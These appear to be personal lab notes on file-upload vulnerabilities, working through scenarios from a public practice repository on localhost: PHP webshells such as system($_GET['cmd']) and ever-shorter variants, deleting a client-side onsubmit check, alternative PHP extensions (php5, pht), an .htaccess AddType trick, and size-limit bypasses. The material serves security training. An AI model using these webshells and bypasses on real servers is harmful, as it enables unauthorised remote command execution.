
Imagine that you have a webpage, and this page have a section of uploads file, like an image of the profile.

You can upload a malicious file like a reverse shell in php if the server have apache and interpret php

---

# Upload 1

You can upload a webshell write in php

````php
<?php
    system($_GET['cmd']);
?>
````

When you open the url where is the image you can use the parameter cmd to inject commands

> http://localhost:9001/uploads/cmd.php?cmd=id


---

# Upload 3

Only admit files with extensions: .jpg, .jpeg, .bmp, gif, png

When we see some type of validiation we have to check if it is client side or server side (or both)

If we check the source code, we can see an script named **validate.js**

![](../../Images/Pasted%20image%2020230821172705.png)

We can see that in a few lines up that there are an onsubmit attribute 

![](../../Images/Pasted%20image%2020230821172838.png)

If we do ctr+shift+c and click in the buttom of uploads, three lines up we can delete the attribute

![](../../Images/Pasted%20image%2020230821173229.png)

If we delete the attribute we are omitting the script that check if the file have a correct extension

Remember, when you reload the website you have to delete again the submit attribute

And there we go

![](../../Images/Pasted%20image%2020230821173434.png)

🥳🥳 The file was upload successfully

---

# Upload 10

When we try to upload the cmd.php, we can see that the validation is in the server, (**tip --> Apply a redirect when upload the file**)

A server can interpretate different files php with different extensions, you can search in google

> php alternative extensions

You have [hacktricks webpage](https://book.hacktricks.xyz/pentesting-web/file-upload) that contemplates different extensions...

If you open Burpsuite and process the request, you can change the extension of the file

![](../../Images/Pasted%20image%2020230822123151.png)
![](../../Images/Pasted%20image%2020230822123201.png)

**Important!!**
He accept the file, but not always that accept the file the code can be interpreted

In this case we can see the code in source code, but this is not interpreted

If the extension don't work you can try other extension (php4, php5)

In this case works with **php5**

![](../../Images/Pasted%20image%2020230822123818.png)

---

# Upload 11

In this lab we try php1,2,3,4,5 but nothing of this works, php6 and php7 are sucessefully upload but the code is not interpreted, we have the **pht** extension an this works

![](../../Images/Pasted%20image%2020230822154943.png)

---

# Upload 12

In this case we can try a lof of extension, but doesn't work

In this case we are going to create a extension that will be interpreted by php

For more information you can search

> .htaccess file upload bypass

To do this you can do the following steps:

1. In filename you can put [.htaccess](https://es.wikipedia.org/wiki/.htaccess)
2. In Content-Type you can put text: **text/plain**
3. Delete the content and put this phrase

> AddType application/x-httpd-php .test


With this phrase (that are going to be in .htaccess file) are you saying that all files that have .test can interprete php code

![](../../Images/Pasted%20image%2020230822160350.png)

If we can upload this file, all file that have extension .test are going to be interpreted by php

![](../../Images/Pasted%20image%2020230822160515.png)
![](../../Images/Pasted%20image%2020230822160528.png)

The solution of this is that a user can't upload a .htacess file

---

# Upload 16

Now the restriction is by the size of the file

In this case, we can see the max size in the **request**

![](../../Images/Pasted%20image%2020230822162110.png)

You can change the size of the file 

or

You can reduce the code of php (monkey pentester offers a reverse shell in one line for this occasions)

In this case if you change a little the code, you can upload the file

````php
<?php system($_GET['c']);?>
````

You can use a 0 

````php
<?php system($_GET[0]);?>
````

In the url be like:

> http://localhost:9001/upload16/uploads/cmd.php?0=id

---

# Upload 17

In this case the size is less, when you try the web shell with

````php
<?php system($_GET[0]); ?>
````

Doesn't work, you can try with other utilities that exec, but doesn't work

````php
<?php shell_exec($_GET[0]); ?>
````

But you can limit this so much like this

````php
<?=`$_GET[0]`?>
````

To use this is equal than the other ocassions

> http://localhost:9001/upload17/uploads/setenso.php?0=id



---

# Labs

- https://github.com/moeinfatehi/file_upload_vulnerability_scenarios


---

# Tags

#vulnerabilty #uploadfiles #webshell #php 